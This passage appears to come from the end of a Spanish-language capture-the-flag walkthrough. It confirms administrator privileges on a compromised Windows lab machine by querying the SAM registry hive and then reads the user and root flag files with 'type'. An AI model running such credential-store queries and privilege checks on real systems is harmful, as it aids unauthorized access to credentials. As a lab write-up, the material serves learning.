Otra opción es tratar de leer el **SAM**, pero aunque no muestre nada, si no da el mensaje **Acceso Denegado**, quiere decir que somos el **Administrador**:
```batch
C:\>reg query HKLM\SAM
reg query HKLM\SAM

HKEY_LOCAL_MACHINE\SAM\SAM
```

Por último, la mejor prueba sería tratar de ver el contenido de directorios a los que tiene acceso el **Administrador**, en este caso, podemos probar si vemos las flags:
```batch 
C:\>type C:\Users\Hacker\Desktop\User.txt
type C:\Users\Hacker\Desktop\User.txt
...
C:\>type C:\Users\Administrador\Desktop\Root.txt
type C:\Users\Administrador\Desktop\Root.txt
...
```
Y con esto, terminamos la máquina.
